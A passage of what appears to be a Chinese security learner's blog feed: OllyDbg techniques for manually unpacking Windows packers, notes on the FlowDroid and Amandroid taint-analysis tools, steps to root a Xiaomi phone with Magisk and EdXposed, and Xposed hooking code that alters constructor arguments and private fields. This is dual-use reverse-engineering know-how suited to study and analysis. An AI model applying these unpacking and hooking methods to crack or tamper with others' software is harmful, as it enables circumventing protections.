<li><p>自动查找，获取输入表，显示无效，修复转存文件</p>
</li>
</ul>
<h1 id="手脱ASPACK壳"><a href="#手脱ASPACK壳" class="headerlink" title="手脱ASPACK壳"></a>手脱ASPACK壳</h1><p>ASPack 2.12 -&gt; Alexey Solodovnikov</p>
<p>工具：PEID和OD</p>
<p>6种方法脱</p>
<ul>
<li><p>方法1：单步跟踪（在哪那个call的时候，程序会跑起来，要f7）</p>
</li>
<li><p>方法2：ESP定律</p>
</li>
<li><p>方法3：一步直达</p>
</li>
<li><p>方法4：2次内存镜像</p>
</li>
<li><p>方法5：模拟跟踪（自动查找程序的OEP）</p>
<ul>
<li>tc eip&lt;xxxxxx（SFX的地址，第一个）</li>
</ul>
</li>
<li><p>方法6：SFX在调试选项里面）选择块方式跟踪正真的入口，或者其下一个，就会自动跳转到OEP的地方</p>
</li>
</ul>
<h1 id="手脱NSPACK（北斗）"><a href="#手脱NSPACK（北斗）" class="headerlink" title="手脱NSPACK（北斗）"></a>手脱NSPACK（北斗）</h1><p>nSPack 1.3 -&gt; North Star&#x2F;Liu Xing Ping</p>
<p><strong>离头比较近的call一般跟进去</strong></p>
<p> NsPacK V3.7 -&gt; LiuXingPing *</p>
<p> at GetVersion（在命令行这里输入这个，就可以在这个地方下断点。。。适合于北斗3.0以前的壳）</p>
<p>WILLSOFT STUDIO</p>
<p><a href="http://www.054live.com.cn/">www.054live.com.cn</a></p>
<h1 id="手脱FSG壳"><a href="#手脱FSG壳" class="headerlink" title="手脱FSG壳"></a>手脱FSG壳</h1><p>FSG 2.0 -&gt; bart&#x2F;xt(代码不长向下拉就可哟看到连续三个跳转，其中有一个就是跳到oep的) </p>
<p>重点为修复</p>
<p>手动、查找IAT</p>
<p>在OEP哪里点一下回车就会看见call*****，就有一些IAT，主模块，d call的地址</p>
<p>，在数据窗口中显示数值过后，向上拉，直到数值全为0，记下地址，向下拉全为0(好像是没有函数的地方)的地方记下地址，，在修复的那里，填写，</p>
<p>rva</p>
<p><strong>特殊的esp定律法，FSG 2.0 -&gt; bart&#x2F;xt专用的</strong></p>
<p>单步popad下面</p>
<p>看堆栈里面下数第四行，右键在反汇编窗口跟随</p>
<p>下硬件断点，</p>
<p>然后shift+f9</p>
<p>00425000  77DA6BF0 ADVAPI32.RegCloseKey</p>
<p>00425280  7C838DE8 kernel32.LCMapStringA</p>
<p><a href="http://www.054live.com.cn/">www.054live.com.cn</a></p>
<p>willsoft studio</p>
<p>A、去掉ASLR—LODPE——pe编辑器——特征值的…..的那个，点开，勾选重定位就可以了，file header，里面的那个clickhere</p>
<p>ASLR开启的话，基地址是随机的</p>
<p>【ASLR关闭工具】OD载入每次入口地址都不一样怎么办？就这么办。</p>
<p><a href="http://www.52pojie.cn/thread-377450-1-1.html">http://www.52pojie.cn/thread-377450-1-1.html</a></p>
<p>B、不去掉ASLR—修复重定位</p>
<p>排查崩溃原因，忽略所有异常过后，运行程序失败，看见堆栈信息，右键在反汇编窗口跟随，下个断点，地址复制下来，在有壳的地方</p>
<h1 id="手脱PECompact2-X的壳"><a href="#手脱PECompact2-X的壳" class="headerlink" title="手脱PECompact2.X的壳"></a>手脱PECompact2.X的壳</h1><p>PECompact 2.x -&gt; Jeremy Collake</p>
<ol>
<li>单步.</li>
<li>ESP定律 </li>
<li>方法：</li>
</ol>
<ul>
<li>BP VirtualFree 下断点</li>
<li>SHIFT+F9，取消断点</li>
<li>ALT+F9  返回到用户代码</li>
<li>查找 push 8000(特征码)</li>
<li>运行到这</li>
<li>单步跟</li>
</ul>
<ol start="4">
<li><p>方法：</p>
<ol>
<li>BP VirtualFree</li>
<li>两次SHIFT+F9</li>
<li>中断后取消断点，Alt+F9返回</li>
<li>单步走。</li>
</ol>
</li>
<li><p>方法</p>
<ul>
<li>0040A86D &gt; B8 74DE4500   mov eax,qqspirit.0045DE74</li>
</ul>
</li>
</ol>
<p>bp 0045de74  程序开始的代码的那个地址 shift+ f9然后取消断点</p>
<p>到return的时候程序就会跑起来，所以在return 下面的一句下断点</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">045DE74  B8 F9CB45F0   mov eax,F045CBF9</span><br><span class="line">0045DE79  8D88 9E120010  lea ecx,dword ptr ds:[eax+1000129E]</span><br><span class="line">0045DE7F  8941 01     mov dword ptr ds:[ecx+1],eax</span><br><span class="line">0045DE82  8B5424 04    mov edx,dword ptr ss:[esp+4]</span><br><span class="line">0045DE86  8B52 0C     mov edx,dword ptr ds:[edx+C]</span><br><span class="line">0045DE89  C602 E9     mov byte ptr ds:[edx],0E9</span><br><span class="line">0045DE8C  83C2 05     add edx,5</span><br><span class="line">0045DE8F  2BCA      sub ecx,edx</span><br><span class="line">0045DE91  894A FC     mov dword ptr ds:[edx-4],ecx</span><br><span class="line">0045DE94  33C0      xor eax,eax</span><br><span class="line">0045DE96  C3       retn</span><br><span class="line">0045DE97  B8 78563412   mov eax,12345678//下断</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>方法6</p>
<ol>
<li>bp VirtualAlloc SHIFT+F9运行</li>
<li>取消断点</li>
<li>ALT+F9  好像是Ctrl+f9</li>
<li>向下拉，看到JMP。运行到这</li>
</ol>
</li>
<li><p>方法7最后一次异常法；</p>
<ol>
<li>取消所有异常。</li>
<li>2次跑飞。先shift +f9按m-1次</li>
<li>在堆栈窗口找SE句柄</li>
<li>转到SE xxxx处</li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">045DE74  B8 F9CB45F0   mov eax,F045CBF9</span><br><span class="line">0045DE79  8D88 9E120010  lea ecx,dword ptr ds:[eax+1000129E]</span><br><span class="line">0045DE7F  8941 01     mov dword ptr ds:[ecx+1],eax</span><br><span class="line">0045DE82  8B5424 04    mov edx,dword ptr ss:[esp+4]</span><br><span class="line">0045DE86  8B52 0C     mov edx,dword ptr ds:[edx+C]</span><br><span class="line">0045DE89  C602 E9     mov byte ptr ds:[edx],0E9</span><br><span class="line">0045DE8C  83C2 05     add edx,5</span><br><span class="line">0045DE8F  2BCA      sub ecx,edx</span><br><span class="line">0045DE91  894A FC     mov dword ptr ds:[edx-4],ecx</span><br><span class="line">0045DE94  33C0      xor eax,eax</span><br><span class="line">0045DE96  C3       retn</span><br><span class="line">0045DE97  B8 78563412   mov eax,12345678//下断</span><br></pre></td></tr></table></figure>
<ol start="8">
<li>两次内存</li>
<li>at GetVersion</li>
</ol>
<h1 id="手脱EZIP-壳"><a href="#手脱EZIP-壳" class="headerlink" title="手脱EZIP 壳"></a>手脱EZIP 壳</h1><ol>
<li>单步</li>
<li>ESP定律</li>
</ol>
<p>修复完成之后还是不能运行的话，有时候可以用重建PE的方法。</p>
<h1 id="手脱tElock-0-98b1壳"><a href="#手脱tElock-0-98b1壳" class="headerlink" title="手脱tElock 0.98b1壳"></a>手脱tElock 0.98b1壳</h1><ol>
<li>最后一次异常法  在堆栈找到se句柄 然后Ctrl +g</li>
<li>模拟跟踪  tc eip &lt;SFX的地址</li>
<li>两次内存镜像</li>
</ol>
<p>重点还是修复 等级3跟踪。要打开原来的程序修复，后来再剪切无效函数</p>
<h1 id="手脱exe32pack壳"><a href="#手脱exe32pack壳" class="headerlink" title="手脱exe32pack壳"></a>手脱exe32pack壳</h1><ol>
<li>ESP定律</li>
<li>下断：BP IsDebuggerPresent <ul>
<li>运行，取消断点</li>
<li>ALT+F9</li>
<li>计算ss+edi</li>
<li>转到OEP！</li>
</ul>
</li>
</ol>
<h1 id="脱WinUpack加的壳"><a href="#脱WinUpack加的壳" class="headerlink" title="脱WinUpack加的壳"></a>脱WinUpack加的壳</h1><p>加条件断点的方法。  Eax&#x3D;0的时候  函数重建，一直在循环，不能让他直接强行跳转到OEP</p>
<h1 id="脱壳的基本思路及小结"><a href="#脱壳的基本思路及小结" class="headerlink" title="脱壳的基本思路及小结"></a>脱壳的基本思路及小结</h1><p>壳的分类：压缩壳、加密壳</p>
<p>脱壳的基本方法：</p>
<ol>
<li><p>单步</p>
</li>
<li><p>ESP定律</p>
</li>
<li><p>内存镜像</p>
</li>
<li><p>模拟跟踪（2类）</p>
</li>
<li><p>最后一次异常</p>
<ol>
<li><p>SFX跟踪</p>
</li>
<li><p>tc eip&lt;XXXX</p>
</li>
</ol>
</li>
<li><p>特殊</p>
</li>
</ol>
<h1 id="常见语言的程序入口点："><a href="#常见语言的程序入口点：" class="headerlink" title="常见语言的程序入口点："></a>常见语言的程序入口点：</h1><p>VB：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">004012D4 &gt; 68 54474000   push QQ个性网.00404754</span><br><span class="line">004012D9  E8 F0FFFFFF   call &lt;jmp.&amp;MSVBVM60.#100&gt;</span><br><span class="line">004012DE  0000      add byte ptr ds:[eax],al</span><br><span class="line">004012E0  0000      add byte ptr ds:[eax],al</span><br><span class="line">004012E2  0000      add byte ptr ds:[eax],al</span><br><span class="line">004012E4  3000      xor byte ptr ds:[eax],al</span><br><span class="line">004012E6  0000      add byte ptr ds:[eax],al</span><br><span class="line">004012E8  48       dec eax</span><br></pre></td></tr></table></figure>

<p>delphi:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 004A5C54 &gt; 55       push ebp</span><br><span class="line">004A5C55  8BEC      mov ebp,esp</span><br><span class="line">004A5C57  83C4 F0     add esp,-10</span><br><span class="line">004A5C5A  B8 EC594A00   mov eax,openpro.004A59EC</span><br></pre></td></tr></table></figure>

<p>BC++:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401678 &gt; /EB 10      jmp short btengine.0040168A</span><br><span class="line">0040167A  |66:623A     bound di,dword ptr ds:[edx]</span><br><span class="line">0040167D  |43       inc ebx</span><br><span class="line">0040167E  |2B2B      sub ebp,dword ptr ds:[ebx]</span><br><span class="line">00401680  |48       dec eax</span><br><span class="line">00401681  |4F       dec edi</span><br><span class="line">00401682  |4F       dec edi</span><br><span class="line">00401683  |4B       dec ebx</span><br><span class="line">00401684  |90       nop</span><br><span class="line">00401685 -|E9 98005400   jmp 00941722</span><br><span class="line">0040168A  \A1 8B005400   mov eax,dword ptr ds:[54008B]</span><br><span class="line">0040168F  C1E0 02     shl eax,2</span><br><span class="line">00401692  A3 8F005400   mov dword ptr ds:[54008F],eax</span><br><span class="line">00401697  52       push edx</span><br><span class="line">00401698  6A 00      push 0</span><br><span class="line">0040169A  E8 99D01300   call &lt;jmp.&amp;KERNEL32.GetModuleHandleA&gt;</span><br><span class="line">0040169F  8BD0      mov edx,eax</span><br></pre></td></tr></table></figure>

<p>VC++:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0040A41E &gt; 55       push ebp</span><br><span class="line">0040A41F  8BEC      mov ebp,esp</span><br><span class="line">0040A421  6A FF      push -1</span><br><span class="line">0040A423  68 C8CB4000   push 跑跑排行.0040CBC8</span><br><span class="line">0040A428  68 A4A54000   push &lt;jmp.&amp;MSVCRT._except_handler3&gt;</span><br><span class="line">0040A42D  64:A1 00000000 mov eax,dword ptr fs:[0]</span><br><span class="line">0040A433  50       push eax</span><br><span class="line">0040A434  64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">0040A43B  83EC 68     sub esp,68</span><br><span class="line">0040A43E  53       push ebx</span><br><span class="line">0040A43F  56       push esi</span><br><span class="line">0040A440  57       push edi</span><br></pre></td></tr></table></figure>

<p>MASM(汇编):</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">004035C9 &gt; 6A 00      push 0</span><br><span class="line">004035CB  E8 A20A0000   call &lt;jmp.&amp;kernel32.GetModuleHandleA&gt;</span><br><span class="line">004035D0  A3 5B704000   mov dword ptr ds:[40705B],eax</span><br><span class="line">004035D5  68 80000000   push 80</span><br><span class="line">004035DA  68 2C754000   push 11.0040752C</span><br><span class="line">004035DF  FF35 5B704000  push dword ptr ds:[40705B]</span><br><span class="line">004035E5  E8 820A0000   call &lt;jmp.&amp;kernel32.GetModuleFileNameA&gt;</span><br><span class="line">004035EA  E8 87070000   call 11.00403D76</span><br><span class="line">004035EF  6A 00      push 0</span><br><span class="line">004035F1  68 0B364000   push 11.0040360B</span><br><span class="line">004035F6  6A 00      push 0</span><br><span class="line">004035F8  6A 64      push 64</span><br><span class="line">004035FA  FF35 5B704000  push dword ptr ds:[40705B]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Windows安全</category>
        <category>加壳脱壳</category>
      </categories>
      <tags>
        <tag>加壳脱壳</tag>
        <tag>Windows安全</tag>
      </tags>
  </entry>
  <entry>
    <title>TaintAnalysis tools study</title>
    <url>/2022/03/24/TaintAnalysis-tools-study/</url>
    <content><![CDATA[<h1 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h1><p>sources and sinks</p>
<blockquote>
<p><strong>sources</strong>: the information we want to protect on a mobile device (e.g., phone number, contacts, location, and unique device identifiers) </p>
<p><strong>sinks</strong>: points of unwanted information release (e.g., methods related to the Internet and SMS transmission). </p>
<p>If data from a sensitive source reaches a sink, taint tracking identifies the path from the source to the sink as an instance of data leakage.</p>
</blockquote>
<span id="more"></span>

<h1 id="Flowdroid"><a href="#Flowdroid" class="headerlink" title="Flowdroid"></a>Flowdroid</h1><p>从2.0版本之后就可以处理ICC了</p>
<blockquote>
<p>使用这些污点分析工具的时候并不一定非要在源代码的基础上面修改，也可以直接使用他们的库，只要能够达到我的目的即可。</p>
</blockquote>
<p><a href="https://github.com/secure-software-engineering/FlowDroid">https://github.com/secure-software-engineering/FlowDroid</a></p>
<p>flowdroid采用保守策略 ，将框架分为四种：generation, exclude, kill, and default</p>
<ul>
<li>When method parameters (including the receiver object itself) or their fields are tainted, the methods in the <strong>generation</strong> type will have their receiver and the return value, as well as all their fields, tainted; no taint will be propagated for methods of the <strong>exclude</strong> type; </li>
<li>all taints will be removed for methods of the <strong>kill</strong> type. </li>
<li>If a method is not assigned with any of these types, the <strong>default</strong> rule will apply , propagating the taint<br>from the receiver object and its fields to the method return value and its fields. </li>
<li>That is, only for the methods in the <strong>generation</strong> type FLOWDROID will propagate the taint from method parameters and will taint the receiver parameter and its fields; it does not taint any other method parameters in any of the conservative strategies.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar soot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar \</span><br><span class="line">    -a &lt;APK File&gt; \</span><br><span class="line">    -p &lt;Android JAR folder&gt; \</span><br><span class="line">    -s &lt;SourcesSinks file&gt;</span><br></pre></td></tr></table></figure>

<p>本电脑的命令使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar soot-infoflow-cmd-2.9.0-jar-with-dependencies.jar -d -a D:\mobileForensics\apks\tests\app-realse.apk -p D:\android\android-platforms -s D:\mobileForensics\SourcesAndSinks.txt -o outputs -t</span><br></pre></td></tr></table></figure>

<p>java -jar soot-infoflow-cmd-2.9.0-jar-with-dependencies.jar -a D:\mobileForensics\Mixed -p D:\android\android-platforms -s D:\mobileForensics\SourcesAndSinks.txt -o .&#x2F;output</p>
<p>For FlowDroid can thus generate a main method in which every order of individual component lifecycles and callbacks is possible, it does not need to simulate all possible paths.</p>
<p><strong>In FlowDroid, only method calls can be the original source of a taint.</strong> </p>
<p>主要流程：</p>
<ol>
<li>解析文件</li>
<li>Next, FlowDroid generates the main method from the list of lifecycle and  callback methods (see the Paragraphs Callbacks and Substitution Classes for more  information). This main method is then used to generate a call graph and an  inter-procedural control-flow graph (ICFG). </li>
<li>Starting at the detected sources,  the taint analysis then tracks taints by traversing the ICFG as explained in  Section 4.</li>
<li>Native Calls require a special treatment which is described below along with a  performance optimization called Taint Wrapping. </li>
<li>At the end, FlowDroid reports  all discovered flows from sources to sinks.</li>
</ol>
<h1 id="Amandroid"><a href="#Amandroid" class="headerlink" title="Amandroid"></a>Amandroid</h1><p>支持native层，实现了一个流和上下文敏感的内部组件数据流分析。在一个过程间的控制流图和数据流图之上，为每一个组件构建一个数据依赖图，然后生成一个汇总表，记录可能的组件间通信连接。</p>
<p>不能处理隐式流。</p>
<ul>
<li>AMANDROID precisely models a subset of Android framework methods and applies a conservative strategy for the remaining ones. </li>
<li>Interestingly , AMANDROID’s strategy is different from that of FLOWDROID:<ul>
<li>in addition to the receiver object and the return value of a method, AMANDROID also taints all method parameters and their fields. </li>
<li>However, it is doing so only <strong>when the method receiver or parameters themselves</strong><br><strong>are tainted</strong>, not when one of their fields is tainted. </li>
<li>Strategies applied by both tools lead to false positive and false negative results, albeit in different cases, as we show in our evaluation.</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220418121650.png" alt="amdroid分析流程"></p>
<h1 id="静态分析工具的对比"><a href="#静态分析工具的对比" class="headerlink" title="静态分析工具的对比"></a>静态分析工具的对比</h1><p><img src="https://raw.githubusercontent.com/Dfault0/images/main/image-20220406161407676.png" alt="静态分析工具的对比"></p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>taint analysis</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>taint analysis tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Xposed安装</title>
    <url>/2022/06/01/Xposed%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="设备解锁"><a href="#设备解锁" class="headerlink" title="设备解锁"></a>设备解锁</h1><p>devices: xiomi 6x</p>
<p>如果手机没有解锁则，需要解锁：</p>
<ul>
<li>解锁需要专门的工具：<a href="https://www.miui.com/unlock/index.html">https://www.miui.com/unlock/index.html</a></li>
<li>解锁的时候，手机需要登录上小米账号，插上sim卡</li>
<li>如果出现电脑识别不了usb，可能是因为电脑的USB驱动是2.0的，数据线也要是2.0的，如果不是，则需要安装一个3.0的驱动。<a href="https://miuiver.com/usb3-fix/">https://miuiver.com/usb3-fix/</a></li>
<li>然后直接点击解锁即可</li>
</ul>
<h1 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h1><p>通过线刷来刷入想要的Android版本，<strong>注意需要版本相同才可以刷入Google原生的版本</strong>，但是我并没有找到，线刷步骤以及获取root权限：</p>
<ol>
<li>为了方便其他的需要，从新刷入了Android8.1的稳定版（先刷了一次测试版，但是测试版老是自动关机，目前稳定版没有自动关机过），这个较为简单，跟着教程来就可以了</li>
<li>由于使用了TWRP进入recovery模式之后需要输入密码，而一般的软件并不能解锁system,所以选择的是，Magisk Manager来进行刷机</li>
<li>手机安装上Magisk Manager，在设置里选择app的更新通道为：稳定版本（测试版本会出现手机关机后root权限消失的问题。</li>
<li>将上面线刷的线刷包里面的boot.img移动到手机上：adb push boot.img &#x2F;sdcard&#x2F;downloads&#x2F;</li>
<li>打开magisk 选择安装，方式可以选择并修补一个文件，然后选择上第4步的文件，进行修复，然后回生成一个img文件，在特定目录下，或者选择直接安装也是一样的</li>
<li>将生成的文件移动到电脑，将手机启动到fastboot模式：adb reboot bootloader</li>
<li>将上面生成的img文件刷入到手机：<strong>fastboot flash boot boot.img</strong> ,注意这里只能使用boot，不能使用别的命令，否则会失败。</li>
<li>至此手机的root权限就得到了</li>
</ol>
<h1 id="安装edxposed"><a href="#安装edxposed" class="headerlink" title="安装edxposed:"></a>安装edxposed:</h1><ol>
<li>首先需要准备的东西,magisk刷机包v24.3，riru刷机包v25.4.4，edxposed刷机包v0.5.2.2</li>
<li>magisk刷机包，将下载的magisk.apk 后缀名修改为zip即可</li>
<li>然后将三个文件放入手机上</li>
<li>在magisk上面安装模块，注意安装顺序，先安装magisk.zip、然后是riru(注意版本问题，否则会识别不上)、edxposed</li>
</ol>
<h1 id="相关连接"><a href="#相关连接" class="headerlink" title="相关连接"></a>相关连接</h1><p>小米6x线刷包：<a href="https://xiaomirom.com/rom/mi-6x-wayne-china-fastboot-recovery-rom/">https://xiaomirom.com/rom/mi-6x-wayne-china-fastboot-recovery-rom/</a></p>
<p>线刷教程： <a href="https://www.miui.com/shuaji-393.html">https://www.miui.com/shuaji-393.html</a></p>
<p>xposed: <a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
<p>edxposed: <a href="https://github.com/ElderDrivers/EdXposed">https://github.com/ElderDrivers/EdXposed</a></p>
<p>magisk: <a href="https://github.com/topjohnwu/Magisk">https://github.com/topjohnwu/Magisk</a></p>
<p>twrp: <a href="https://twrp.me/Devices/">https://twrp.me/Devices/</a></p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>Xposed</category>
      </categories>
      <tags>
        <tag>Xposed</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Xposed基础</title>
    <url>/2022/05/31/Xposed%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Xposed框架原理"><a href="#Xposed框架原理" class="headerlink" title="Xposed框架原理"></a>Xposed框架原理</h1><ul>
<li><p>init 进程负责创建 zygote 进程。</p>
</li>
<li><p>控制zygote进程：通过替换&#x2F;system&#x2F;bin&#x2F;app_precesss程序（zygote的可执行程序）控制zygote进程，</p>
</li>
<li><p>使得它在系统启动的过程种 会加载Xposed framework的一个jar文件，即XposedBridge.jar，</p>
</li>
<li><p>从而完成对Zygote进程及其创建的Dalivik&#x2F;ART虚拟机的劫持，并且能够允许开发者独立的替换任何class文件，比如framework本身，系统UI又或者随意的一个app。</p>
</li>
</ul>
<h1 id="hook构造函数"><a href="#hook构造函数" class="headerlink" title="hook构造函数"></a>hook构造函数</h1><p>基本流程：</p>
<ol>
<li><p>copy XposedBridgeApi.jar到项目得libs目录，在app下面得build.gradle中添加依赖</p>
<p><code>compileOnly files(&#39;libs/XposedBridgeApi-54.jar&#39;)</code></p>
</li>
<li><p>修改app目录下的build.gradle，并在AndroidManifest.xml文件中增加Xposed相关内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;插件描述信息&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;54&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>新建Hook类，编写hook代码 必须是public得</p>
</li>
<li><p><strong>在project模式下得main目录下新建assets文件夹</strong>，然后再assets目录下新建文件xposed_init，在里面写上hook类得完整路径，比如：com.example.xposed01.hookConstructors，否则会找不到</p>
</li>
</ol>
<p>hook类构造其器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hookConstructors</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.i(<span class="string">&quot;Xposed01 - packagename:&quot;</span>,loadPackageParam.packageName);</span><br><span class="line">        <span class="comment">//包名符合才进行hook，或者可能会影响其他app的正常运行</span></span><br><span class="line">        <span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.kanxue.xposedhook01&quot;</span>)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			主要得两个函数</span></span><br><span class="line"><span class="comment">	public static Unhook findAndHookMethod(Class&lt;?&gt; clazz, String methodName, Object... parameterTypesAndCallback);</span></span><br><span class="line"><span class="comment">    public static Unhook findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">			*/</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> loadPackageParam.classLoader;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">StrudentClazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.kanxue.xposedhook01.Student&quot;</span>);</span><br><span class="line">            <span class="comment">//    public static Class&lt;?&gt; findClass(String className, ClassLoader classLoader) &#123;</span></span><br><span class="line">            Class&lt;?&gt; stuClazz = XposedHelpers.findClass(<span class="string">&quot;com.kanxue.xposedhook01.Student&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">            XposedHelpers.findAndHookConstructor(StrudentClazz, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;Student is hooked beforeHookedMethod!!!!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;Student is hooked afterHookedMethod!!!!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*  hook带参数得构造函数</span></span><br><span class="line"><span class="comment">                public Student(String name)  ，注意参数是.class</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            </span><br><span class="line">            XposedHelpers.findAndHookConstructor(StrudentClazz, String.class,<span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    java.lang.Object[] argsObj = param.args;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) argsObj[<span class="number">0</span>];</span><br><span class="line">                    <span class="comment">//可以直接对其进行修改</span></span><br><span class="line">                    argsObj[<span class="number">0</span>] = <span class="string">&quot;12345678&quot;</span>;</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;Student(String) is hooked beforeHookedMethod!!!! name:&quot;</span>+name);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;args:&quot;</span>+param);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;(String) is hooked afterHookedMethod!!!!&quot;</span>);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;args:&quot;</span>+param);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>注意构造函数生成的对象：</p>
<ul>
<li>afterHookedMethod函数中：<code>Object thisobj = param.thisObject;</code></li>
<li>可以多看看XposedHelpers类，他可以调用很多得静态方法，一般在AS里面会有提示</li>
</ul>
<h1 id="xposed修改属性"><a href="#xposed修改属性" class="headerlink" title="xposed修改属性"></a>xposed修改属性</h1><p>xposed插件的dex也是运行在当前进程的进程空间的。</p>
<p>可以通过Java反射来进行修改</p>
<p>静态属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	使用Java反射修改静态属性</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">ClassLoader pathClassLoader= loadPackageParam.classLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Class stuClass=pathClassLoader.loadClass(<span class="string">&quot;com.kanxue.xposedhook01.Student&quot;</span>);</span><br><span class="line">XposedBridge.log(<span class="string">&quot;StudentClass-&gt;&quot;</span>+stuClass);</span><br><span class="line">Field teacherField=stuClass.getDeclaredField(<span class="string">&quot;teacher&quot;</span>);</span><br><span class="line"><span class="comment">//就算这个属性是私有的，但是也可以通过下面的语句来获取，并且也是可以修改的</span></span><br><span class="line">teacherField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">teacherField.set(<span class="literal">null</span>,<span class="string">&quot;teacher666&quot;</span>);</span><br><span class="line">String teachername1= (String) teacherField.get(<span class="literal">null</span>);</span><br><span class="line">XposedBridge.log(<span class="string">&quot;teacherField-&gt;&quot;</span>+teachername1);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	通过xposed API修改</span></span><br><span 